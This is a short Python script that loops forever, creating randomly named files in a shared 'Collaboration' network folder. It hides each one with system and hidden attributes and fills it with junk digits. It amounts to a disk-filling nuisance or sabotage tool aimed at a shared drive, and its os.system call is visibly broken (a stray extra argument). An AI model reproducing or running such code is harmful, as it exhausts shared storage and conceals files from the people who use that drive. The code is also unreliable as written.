import random, os
while True:
    x = ""
    for i in range(1, 40):
        x += str(random.randint(0, 9))
    v = str(random.randint(1, 100))
    d = open("X:\Collaboration\Recycling Bin\New folder\New folder" + x + "." + v, "w+")
    os.system("attrib +s +h X:\Collaboration\Recycling Bin\New folder\New folder" + x + "." + v, "w+")
    d.write(x * 10)
    d.close()
